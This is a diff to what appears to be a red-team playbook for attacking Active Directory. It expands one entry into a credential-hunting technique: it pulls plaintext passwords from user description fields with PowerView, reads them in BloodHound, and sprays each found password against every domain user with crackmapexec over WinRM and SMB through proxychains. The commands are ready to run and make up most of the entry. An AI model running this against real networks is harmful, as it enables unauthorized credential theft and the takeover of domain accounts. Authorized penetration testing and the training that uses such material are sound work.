@@ -209,14 +209,26 @@
 - **Context:** Find accounts where password is not required -- may have blank or weak passwords
 - **Payload/Method:** `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol`
 
-### Description Field Credential Hunting [added: 2026-04]
-- **Tags:** #DescriptionField #CredentialHunting #PasswordInDescription #PowerView #ADEnum #T1552.001
-- **Trigger:** Standard password attacks failed; searching for credentials stored in AD attributes
-- **Prereq:** Valid domain credentials, PowerView loaded
-- **Yields:** Plaintext passwords or hints stored in user description fields by admins
-- **Opsec:** Low
-- **Context:** Admins sometimes store passwords in the AD description field
-- **Payload/Method:** `Get-DomainUser * | Select-Object samaccountname,description`
+### Description Field Credential Hunting + Password Spray Seed [added: 2026-04]
+- **Tags:** #DescriptionField #CredentialHunting #PasswordInDescription #PowerView #ADEnum #PasswordSpray #CredentialReuse #BloodHound #T1552.001
+- **Trigger:** Enumerating AD users after gaining any domain foothold; any account — especially service accounts — visible in BloodHound Node Info
+- **Prereq:** Valid domain credentials; PowerView loaded or BloodHound data available
+- **Yields:** Plaintext passwords stored by admins — and critically: a spray candidate to test against ALL domain users (service account passwords are frequently reused as user passwords by the same admin)
+- **Opsec:** Low (enumeration); Med (subsequent spray)
+- **Context:** Admins who store passwords in the Description field often apply the same password to multiple accounts they manage. When you find a Description-field password on a service account, treat it as a **domain-wide spray seed** — enumerate all domain users and spray it. In practice this finds domain users sharing the same "service password." Also check BloodHound Node Info for every service account — the Description field is visible there without any extra queries. Always spray found passwords before attempting to crack hashes.
+- **Payload/Method:**
+  ```powershell
+  # Enumerate all descriptions
+  Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.description}
+
+  # BloodHound: Node Info tab on any user/computer → check Description field
+
+  # Once a password is found, spray it across all domain users:
+  # (from Linux via proxychains)
+  proxychains cme winrm <subnet> -u users.txt -p 'FoundPassword123!' -d <domain>
+  # or
+  proxychains cme smb <subnet> -u users.txt -p 'FoundPassword123!' -d <domain> --no-bruteforce
+  ```
 
 ### Snaffler — Automated Share File Hunting [added: 2026-04]
 - **Tags:** #Snaffler #ShareHunting #FileCrawl #SensitiveFiles #Credentials #DataDiscovery #T1083
